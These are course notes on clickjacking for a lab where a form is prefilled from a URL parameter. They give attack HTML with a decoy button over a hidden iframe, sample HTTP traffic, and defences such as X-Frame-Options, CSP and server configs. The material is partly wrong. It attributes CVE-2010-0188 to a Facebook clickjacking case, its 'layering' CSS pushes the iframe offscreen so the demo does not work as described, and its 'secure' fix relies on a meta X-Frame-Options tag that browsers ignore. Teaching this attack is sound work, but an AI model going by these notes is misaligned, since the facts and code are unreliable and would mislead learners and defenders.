---
course: Web Security
topic: Clickjacking
tags: [web-security]
---

## Introduction to Clickjacking

Clickjacking, also known as UI redress attack or User Interface Redressing, is a malicious technique used to trick users into clicking on something different from what they perceive they are clicking. This can lead to unauthorized actions being performed on behalf of the victim, such as changing account settings, making purchases, or even downloading malware. The attack exploits the way browsers handle overlapping elements and the transparency of certain HTML elements.

### What is Clickjacking?

Clickjacking occurs when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another webpage. While the user thinks they are clicking on a button or link on the attacker's page, they are actually clicking on a hidden button or link on another page. This can result in the user unknowingly performing actions that they did not intend to perform.

### Why Does Clickjacking Matter?

Clickjacking is significant because it can be used to bypass security mechanisms that rely on user interaction, such as CAPTCHAs, login forms, and other interactive elements. By tricking users into performing unintended actions, attackers can gain unauthorized access to sensitive information or perform malicious activities.

### How Does Clickjacking Work?

The core mechanism of clickjacking involves the use of HTML frames and CSS properties to create a layering effect. Here’s a step-by-step breakdown:

1. **Frame Injection**: The attacker injects an iframe into a webpage that the user visits. This iframe contains the target website or application.
2. **Layering**: The attacker overlays a transparent or opaque element on top of the iframe, creating a deceptive interface.
3. **User Interaction**: When the user interacts with the deceptive interface, they are actually interacting with the underlying iframe, which can trigger unintended actions.

### Real-World Example: CVE-2010-0188

One notable real-world example of clickjacking is CVE-2010-0188, which affected Facebook. In this case, an attacker could trick Facebook users into liking a specific page by overlaying a transparent iframe on top of the "Like" button. Users would think they were clicking on a benign link, but they were actually clicking on the "Like" button, thereby granting the attacker unauthorized access to their social graph.

### Lab Setup: Clickjacking with Form Input Data Prefilled from a URL Parameter

In this lab, we will explore a more sophisticated form of clickjacking where the attacker prepopulates a form using a URL parameter and entices the user to inadvertently click on the update email button. This scenario is particularly dangerous because it can lead to unauthorized changes in user account settings.

### Background Theory

To understand clickjacking, it's essential to delve into the underlying principles of web security and browser behavior.

#### Web Security Principles

Web security relies heavily on the principle of least privilege, where users and applications are granted the minimum permissions necessary to perform their tasks. Clickjacking undermines this principle by allowing attackers to perform actions with elevated privileges without the user's knowledge.

#### Browser Behavior

Browsers handle overlapping elements using the z-index property in CSS. The z-index determines the stacking order of elements, with higher values appearing on top of lower values. Attackers exploit this behavior by creating layers that obscure the true nature of the user's interactions.

### Step-by-Step Mechanics

Let's break down the mechanics of the clickjacking attack described in the lab.

#### Step 1: Frame Injection

The attacker injects an iframe into a webpage that the user visits. This iframe contains the target website or application.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Lab</title>
    <style>
        /* Hide the iframe */
        .hidden {
            position: absolute;
            left: -9999px;
        }
    </style>
</head>
<body>
    <!-- Deceptive interface -->
    <div style="position: relative; width: 200px; height: 100px;">
        <button style="position: absolute; top: 0; left: 0; width: 200px; height: 100px;">Click Me Decoy</button>
        <!-- Hidden iframe -->
        <iframe class="hidden" src="https://target-website.com/account?email=attacker@example.com"></iframe>
    </div>
</body>
</html>
```

#### Step 2: Layering

The attacker overlays a transparent or opaque element on top of the iframe, creating a deceptive interface.

```css
.hidden {
    position: absolute;
    left: -9999px;
}
```

#### Step 3: User Interaction

When the user interacts with the deceptive interface, they are actually interacting with the underlying iframe, which can trigger unintended actions.

### Complete Example

Here is a complete example of the HTML and iframe setup:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Lab</title>
    <style>
        /* Hide the iframe */
        .hidden {
            position: absolute;
            left: -9999px;
        }
    </style>
</head>
<body>
    <!-- Deceptive interface -->
    <div style="position: relative; width: 200px; height: 100px;">
        <button style="position: absolute; top: 0; left: 0; width: 200px; height: 100px;">Click Me Decoy</button>
        <!-- Hidden iframe -->
        <iframe class="hidden" src="https://target-website.com/account?email=attacker@example.com"></iframe>
    </div>
</body>
</html>
```

### HTTP Details

When the user clicks on the "Click Me Decoy" button, the following HTTP request is sent to the server:

```http
GET /account?email=attacker@example.com HTTP/1.1
Host: target-website.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://attacker-website.com/clickjacking.html
Upgrade-Insecure-Requests: 1
```

The server responds with the account page, where the email address is prepopulated with the value `attacker@example.com`.

```http
HTTP/1.1 200 OK
Date: Mon, 20 Sep 2021 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Connection: close

<!DOCTYPE html>
<html>
<head>
    <title>Account Settings</title>
</head>
<body>
    <h1>Update Email Address</h1>
    <form action="/update-email" method="POST">
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" value="attacker@example.com">
        <button type="submit">Update Email</button>
    </form>
</body>
</html>
```

### Pitfalls and Common Mistakes

#### Pitfall 1: Overlooking the Importance of User Interaction

One common mistake is underestimating the importance of user interaction in clickjacking attacks. Attackers often rely on social engineering techniques to trick users into performing unintended actions.

#### Pitfall 2: Ignoring Browser Security Features

Modern browsers have implemented several security features to mitigate clickjacking attacks, such as the X-Frame-Options header. However, these features are not foolproof and can be bypassed by skilled attackers.

### How to Prevent / Defend

#### Detection

To detect clickjacking attacks, organizations should implement monitoring and logging mechanisms to track unusual user behavior and unexpected changes in account settings.

#### Prevention

To prevent clickjacking attacks, organizations should implement the following security measures:

1. **X-Frame-Options Header**: Set the X-Frame-Options header to `SAMEORIGIN` or `DENY` to prevent the page from being framed.
   
   ```http
   X-Frame-Options: SAMEORIGIN
   ```

2. **Content Security Policy (CSP)**: Implement a Content Security Policy that restricts the sources from which frames can be loaded.

   ```http
   Content-Security-Policy: frame-ancestors 'self'
   ```

3. **JavaScript Mitigation**: Use JavaScript to detect and prevent framing attempts.

   ```javascript
   if (top !== self) {
       top.location = self.location;
   }
   ```

#### Secure Coding Fixes

Here is an example of a vulnerable code snippet and its secure counterpart:

**Vulnerable Code**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Account Settings</title>
</head>
<body>
    <h1>Update Email Address</h1>
    <form action="/update-email" method="POST">
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" value="<?php echo $_GET['email']; ?>">
        <button type="submit">Update Email</button>
    </form>
</body>
</html>
```

**Secure Code**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Account Settings</title>
    <meta http-equiv="X-Frame-Options" content="SAMEORIGIN">
</head>
<body>
    <h1>Update Email Address</h1>
    <form action="/update-email" method="POST">
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" value="<?php echo htmlspecialchars($_GET['email']); ?>">
        <button type="submit">Update Email</button>
    </form>
</body>
</html>
```

### Configuration Hardening

To harden the configuration against clickjacking attacks, ensure that the server is properly configured to set the X-Frame-Options and Content-Security-Policy headers.

#### Example Nginx Configuration

```nginx
server {
    listen 80;
    server_name example.com;

    location / {
        add_header X-Frame-Options SAMEORIGIN;
        add_header Content-Security-Policy "frame-ancestors 'self'";
    }
}
```

#### Example Apache Configuration

```apache
<IfModule mod_headers.c>
    Header always append X-Frame-Options SAMEORIGIN
    Header always append Content-Security-Policy "frame-ancestors 'self'"
</IfModule>
```

### Conclusion

Clickjacking is a sophisticated attack vector that can lead to unauthorized changes in user account settings. By understanding the mechanics of clickjacking and implementing robust security measures, organizations can effectively defend against these attacks.

### Practice Labs

For hands-on practice with clickjacking, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive set of labs covering various web security topics, including clickjacking.
- **OWASP Juice Shop**: A deliberately insecure web application for security training purposes, which includes clickjacking challenges.
- **DVWA (Damn Vulnerable Web Application)**: Another popular web application for security testing, featuring clickjacking vulnerabilities.

By engaging with these labs, you can gain practical experience in identifying and mitigating clickjacking attacks.

---
<!-- nav -->
[[Web Security (PortSwigger)/05-Clickjacking/03-Lab 2 Clickjacking with form input data prefilled from a URL parameter/00-Overview|Overview]] | [[02-Lab Setup Clickjacking with Form Input Data Prefilled from a URL Parameter|Lab Setup Clickjacking with Form Input Data Prefilled from a URL Parameter]]
